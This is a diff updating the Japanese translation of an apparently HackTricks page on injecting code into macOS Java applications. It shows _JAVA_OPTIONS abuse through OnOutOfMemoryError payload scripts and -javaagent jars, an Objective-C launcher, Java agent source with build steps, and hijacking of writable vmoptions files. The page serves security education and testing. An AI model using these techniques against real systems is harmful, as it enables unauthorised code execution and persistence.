@@ -1,22 +1,22 @@
-# macOS Java アプリケーションインジェクション
+# macOS Javaアプリケーションのインジェクション
 
 <details>
 
-<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
-HackTricks をサポートする他の方法:
+HackTricksをサポートする他の方法：
 
-* **HackTricks にあなたの会社を広告掲載したい場合**や**HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラム グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github リポジトリに PR を提出して、あなたのハッキングテクニックを共有する。
+- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**する。
+- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 
 ## 列挙
 
-システムにインストールされている Java アプリケーションを見つけます。**Info.plist** 内の Java アプリケーションには、文字列 **`java.`** を含むいくつかの Java パラメータが含まれていることが確認されているため、それを検索できます：
+システムにインストールされているJavaアプリケーションを見つけます。**Info.plist**にJavaアプリが含まれていることがわかりました。そのため、**`java.`**という文字列を含むJavaパラメータが含まれている可能性があるため、それを検索できます：
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -26,13 +26,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-環境変数 **`_JAVA_OPTIONS`** は、Javaでコンパイルされたアプリの実行に任意のJavaパラメータを注入するために使用できます：
+環境変数 **`_JAVA_OPTIONS`** は、Javaでコンパイルされたアプリケーションの実行に任意のJavaパラメータを注入するために使用できます：
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-新しいプロセスとして実行し、現在のターミナルの子プロセスとしてではない場合は、次のように使用できます：
+新しいプロセスとして実行し、現在のターミナルの子プロセスとしてではなく使用するには、次のコマンドを使用できます：
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -85,7 +85,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-しかし、実行されたアプリケーションでエラーが発生しますが、もっと隠密な方法はJavaエージェントを作成し、以下を使用することです：
+しかし、それは実行されたアプリケーションでエラーを引き起こす可能性があります。もう1つのより慎重な方法は、Java エージェントを作成して使用することです:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -95,10 +95,10 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-アプリケーションと**異なるJavaバージョン**でエージェントを作成すると、エージェントとアプリケーションの両方の実行がクラッシュする可能性があります
+アプリケーションとは**異なるJavaバージョン**でエージェントを作成すると、エージェントとアプリケーションの両方の実行がクラッシュする可能性があります。
 {% endhint %}
 
-エージェントは以下のようになります：
+エージェントは次のようになります：
 
 {% code title="Agent.java" %}
 ```java
@@ -117,23 +117,21 @@ err.printStackTrace();
 }
 }
 ```
-```
-エージェントをコンパイルするには、以下を実行します:
-```
+{% endcode %}
+
+エージェントをコンパイルするには、次のコマンドを実行します:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-`manifest.txt`を使って：
+`manifest.txt`を使用して：
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-```markdown
-そして、環境変数をエクスポートして、次のようにJavaアプリケーションを実行します:
-```
+その後、環境変数をエクスポートして、次のようにJavaアプリケーションを実行します：
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -144,12 +142,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptionsファイル
 
-このファイルはJavaが実行される際に**Javaパラメータ**を指定することをサポートしています。以前のトリックをいくつか使用してJavaパラメータを変更し、**プロセスに任意のコマンドを実行させる**ことができます。\
-さらに、このファイルは`include`ディレクトリを使って**他のファイルを含める**こともできるので、含まれているファイルを変更することも可能です。
+このファイルは、Javaが実行される際に**Javaパラメータ**の指定をサポートします。以前のトリックのいくつかを使用して、Javaパラメータを変更し、**プロセスが任意のコマンドを実行**することができます。\
+さらに、このファイルは`include`ディレクトリで他のファイルを**含めることもできる**ため、含まれるファイルも変更できます。
 
-さらに、いくつかのJavaアプリケーションは複数の`vmoptions`ファイルを**読み込む**ことがあります。
+さらに、一部のJavaアプリケーションは**複数の`vmoptions`**ファイルを読み込むことがあります。
 
-Android Studioのようなアプリケーションは、これらのファイルをどこで**探しているかを出力で示して**います。例えば：
+Android Studioのような一部のアプリケーションは、これらのファイルを探している場所を**出力**で示しています。
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -160,7 +158,7 @@ Android Studioのようなアプリケーションは、これらのファイル
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-彼らがそうしない場合、以下の方法で簡単にチェックできます:
+もし彼らがしない場合は、簡単に次のようにチェックできます：
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -168,18 +166,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-以下の例で注目すべき点は、Android Studioがファイル **`/Applications/Android Studio.app.vmoptions`** を読み込もうとしていることです。これは **`admin` グループの任意のユーザーが書き込みアクセス権を持っている場所です。**
-
-<details>
-
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
-
-HackTricksをサポートする他の方法:
-
-* **HackTricksにあなたの会社を広告したい**、または **HackTricksをPDFでダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や [**telegramグループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
-
-</details>
+Android Studioのこの例では、興味深いことに、**`/Applications/Android Studio.app.vmoptions`** ファイルを読み込もうとしています。このファイルは、**`admin` グループのユーザーが書き込みアクセス権を持っている場所**です。
